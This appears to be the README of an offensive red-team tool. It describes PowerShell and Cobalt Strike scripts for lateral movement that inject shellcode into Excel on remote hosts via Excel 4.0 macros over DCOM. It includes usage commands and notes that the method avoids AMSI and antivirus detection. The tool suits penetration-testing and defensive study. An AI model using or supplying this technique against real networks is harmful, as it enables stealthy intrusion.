# Excel4-DCOM
PowerShell and Cobalt Strike scripts for lateral movement using Excel 4.0 / XLM macros via DCOM (direct shellcode injection in Excel.exe).

## Technology
Last year, after our presentation at DerbyCon, we released a blog post detailing the abuse of Excel 4.0 macros (also called XLM macros). This is a macro language which is completely different from VBA and which has been embedded within Excel since 1992. The original blog can be found here, which includes a process injection sample: https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/

It turns out that Excel 4.0 macros are also exposed to DCOM via the ExecuteExcel4Macro method. We modified our process injection XLM macro sample to work on remote hosts as well via DCOM and we hereby release it in PowerShell and Cobalt Strike script versions.

## Usage
Cobalt Strike version:
`Excel4-DCOM <targethost> <listener>`
This will inject a x86 staging payload into excel.exe on the target host. Make sure to execute this from a 32 bit beacon (which can be running on a 64 bit system).

PowerShell version:
`Invoke-Excel4DCOM -ComputerName <target> -Payload <payload location>`
This will inject a x86 staging payload into excel.exe on the target host. Make sure to execute this from a 32 bit PowerShell host (%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe). 

## Why would I use this method over lateral movement method XYZ?
A big plus for this method is that it does direct shellcode injection into excel.exe via Windows API calls. In contrast to most other lateral movement methods (including practically all DCOM-based ones), this technique does **not** rely on powershell.exe or any other LOLBIN at the target. Hence, this method can be completely *"fileless"*. And as a plus, AMSI only works for VBA macros and not for XLM, making this method very difficult to detect by AV.

## What are the disadvantages of this method?
Firstly, this method is slow. The Cobalt Strike staging payload (roughly 800 bytes) requires about 1 to 2 minutes to be injected in a remote host. Note that this is mostly due to the Proof of Concept implementation which injects the payload byte-by-byte in order to avoid XLM macro line-length constraints. It should be possible to do this in chunks of 10 bytes, while still remaining under XLM line-length limits. I just need to find some time to brush up my code. :-)

Secondly, due to XLM data type constraints (read our blog for details), this method only targets 32 bit installs of Excel.exe - which fortunately is the vast majority of installations. Note that x86 installs on x64 systems are fine. This also means that you should execute this method from a 32 bit PowerShell host or beacon.

## Authors
Stan Hegt (@StanHacked)
Special thanks to Philip Tsukerman (@PhilipTsukerman) for pointing out to me that Excel 4.0 macros are exposed via DCOM.
